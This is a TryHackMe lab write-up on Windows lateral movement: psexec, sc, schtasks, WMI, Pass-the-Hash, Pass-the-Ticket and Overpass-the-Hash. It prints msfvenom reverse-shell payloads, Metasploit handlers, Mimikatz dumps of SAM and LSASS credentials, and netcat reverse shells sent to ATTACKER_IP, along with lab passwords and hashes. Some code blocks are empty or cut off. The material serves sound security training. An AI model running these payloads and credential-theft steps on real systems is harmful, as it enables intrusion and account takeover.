Task1 - Introduction
---------------------------------------------

Setup DNS  and download Creds:
Username: tracey.turner Password: Letters1974

Task2 - Moving Through the Network
--------------------------------------------------------

This task discusses moving laterally through network using ssh/rdp etc to get to other hosts. This can provide some benefits such as alternate approach to attack, avoiding detection etc. 

Care must be taken though, it might not make sense for a dev user to be connecting to a finance PC or vice-versa.

UAC is imposed on local admins but not default administrator. Local admins cannot remotely connect to other machines for administrative tasks except an interactive session through rdp.


Task3 - Spawning Processes Remotely
-----------------------------------------------------------

In this task we will look at running processes remotely.

Psexec
* Port 445/tcp (SMB)
* Requires Group Membership in Administrators

The way it works:
1.  Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2.  Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3.  Create some named pipes to handle stdin/stdout/stderr.

Format is:
```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

We can do the same thing in Powershell but first we need a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Then use this method to connect:
```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet which run scripts remote via WinRM. Be sure you have your PSCredential object setup 1st:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

You can remotely create services with `sc`

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCE/RPC)
    -   445/TCP (RPC over SMB Named Pipes)
    -   139/TCP (RPC over SMB Named Pipes)
-   **Required Group Memberships:** Administrators

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

Usage:
```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

Another thing we can do is schedule tasks remotely:

Startup:
```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

And stop/cleanup:
```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

Ok let's SSH in using the credentials we got:

```
**User:** ZA.TRYHACKME.COM\t1_leonard.summers
**Password:** EZpass4ever
```

```shell-session
root@ip-10-10-63-136:~# ssh za\\leonard.summers@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.64.249)' can't be established.

Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com,10.200.64.249' (ECDSA) to the list of known hosts.
za\leonard.summers@thmjmp2.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.14393]

za\leonard.summers@THMJMP2 C:\Users\leonard.summers>
```



Note that it is possible to spawn a reverse shell using these methods but the service executable will kill them almost immediately. To get around this we can use msfvenom and encap them in a fully functional service executable.

First we make an exe-service encapsulated reverse shell:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.61.196 LPORT=4444 -o dabomb.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe-service file: 15872 bytes
Saved as: dabomb.exe
```

Now we place it on the server

```bash
C:\Windows\system32>hostname
hostname
THMJMP2

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
[SC] CreateService SUCCESS

```

Setup msfconsole to wait for our reverse shell once we spawn it with the service we will be putting on the iis server.

```bash
root@ip-10-10-63-136:~# msfconsole

You can also do a 1-liner:
```shell-session

```


NOTE: we cannot use sc.exe to specifiy credentials we need to now spawn a new shell. we can use runas to spawn a new shell with t1_leonard.summers access token.

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-4001 
sc.exe \\thmiis.za.tryhackme.com start THMservice-4001

Catch the reverse shell we setup the listener with metaploit on 4444 earlier and then go to desktop of t1_leonard.summers to get the flag:

Task4 - Moving Laterally Using WMI
---------------------------------------------------------

We can also do some techniques using Windows Management Instrumentation (WMI). This is the Windows version of Web-Based Enterprise Management (WBEM).

This tool allows admins to perform standard management tasks.

As before we need a PSCredential object in order to connect to WMI with powershell.

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

-   **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-   **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Use this to connect:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
-   **Required Group Memberships:** Administrators
- 
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Process is created silently without feedback.

For legacy systems:
```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

## Creating Services Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Start service:
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop Service:
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Creating Scheduled Tasks Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

Create Scheduled Task:
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete Scheduled Task:
```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

And for legacy systems:
```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Let's go to town!

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters
**Password:** Korine.1994

Generate a payload for msi type:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > dabomb.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

Upload it:
```bash
root@ip-10-10-63-136:~# smbclient -c 'put dabomb.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$' Korine.1994
WARNING: The "syslog" option is deprecated
putting file dabomb.msi as \dabomb.msi (1714.3 kb/s) (average 1714.3 kb/s)
```

Since we saved our payload to the ADMIN$ share it will be avail on C:\Windows\

Lets start a hander with metaploit:

```bash
Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf5 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.61.196:4445 
```

```shell-session
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Now we invoke it to start the msi install and start service for reverse shell:
```shell-session
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\dabomb.msi"; Options = ""; AllUsers = $false}
```

Now we catch our reverse shell in Meterpreter:
```bash
[*] Command shell session 1 opened (10.50.61.196:4445 -> 10.200.64.201:63626) at 2022-11-09 06:54:20 +0000



C:\Windows\system32>hostname

Now just go to Corines Desktop to get the flag:

Task5 - Use of Alternate Authentication Material
-----------------------------------------------------------------

In this task we will work with using methods to login when we don't know a user's password. Tools like Mimikatz can help us extract credentials.

This works when either NTLM or Kerberos Authentication is available on the network.

## NTLM

For NTLM the process is the following:
1.  The client sends an authentication request to the server they want to access.
2.  The server generates a random number and sends it as a challenge to the client.
3.  The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
4.  The server forwards both the challenge and the response to the Domain Controller for verification.
5.  The domain controller uses the challenge to recalculate the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
6.  The server forwards the authentication result to the client.

This process is done only locally if we aren't on a domain.

## Pass-the-Hash

We don't need to know a user's password. If we get access to the user hash either through mimikatz or accessing the SAM or by extracting hashes directly from LSASS memory we can use a technique called Pass-the-Hash (PtH) to gain access.

__Extracting NTLM Hashes from local SAM__
```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```

__Extracting NTLM Hashes from LSASS memory__

```shell-session
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```

By whatever means we do get the hash, we can use Mimikatz to inject an access token for the victim on a reverse shell or other like this:
```shell-session
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

We would have to have a listener running on our box:
```shell-session
user@AttackBox$ nc -lnvp 5555
```

NOTE: If you use whoami to show what user you are after the attack it will still show the original user, however the commands run will happen as the users credentials that were injected.

Here are some ways to use Pass-the-Hash:
```shell-session
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

```shell-session
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

NOTE: only can be used on Linux version.

```shell-session
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

## Kerberos Authentication

Here is how Kerberos works:

1. The user sends username and timestamp encypted key to the Key Distribution Center on the domain controller.
2. The KDC will send back a Ticket Granting Ticket (TGT) which allows a user to request tickets to other services without sending credentials. Also a Session Key is sent that is used to generate subsequent requests.
3. Next the user asks the KDC for Ticket Granting Service (TGS). For access to the service, we send a new request with username and timestamp encrypted with the Session Key as well as the TGT and a Service Principal Name (SPN), which is the service we want to access.
4. The KDC then sends us a TGS and Service Session Key. This is then used to authenticate against the service. The TGS is encrypted with Service Owner Hash.

We CAN extract service tickets and keys from LSASS memory with Mimikatz, but we generally need SYSTEM privs to do it.

We can do it like this:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

NOTE: We need both the ticket and session key.

TGT is good because if we had Administrator rights we can request access to other services the user might have access to. TGS can be requested from lower level accounts but ones only for that account.

Here is how to use Mimikatz to inject those:
```shell-session
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

To check if the tickets were correctly injected we can use the klist command:
```shell-session
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)

        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

### Overpass-the-Hash / Pass-the-Key

We can do the same type of Attack with Kerberos networks:

To get keys:
```shell-session
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

If we have an RC4 hash, we can  get a reverse shell providing netcat is available:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

With AES128:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

With AES256:
```shell-session
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

NOTE: When using RC4 the key is same as the NTLM hash of a user. This means we can request TGT if RC4 is enabled. This variant is called Overpass-the-Hash (OPtH)

Be sure you have a listener running to catch the reverse shell.

## Let's go to town! 

To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:

User: ZA.TRYHACKME.COM\t2_felicia.dean

Password: iLov3THM!

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`


For this task we will ssh into the jump box using our captured credentials for felicia. Then use mimikatz to extract auth material to do PtH, PtT, or PtK against t1_toby.beck.

After getting a command prompt we can use winrs without needing credentials since they are already available in our current session.

```shell-session
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```
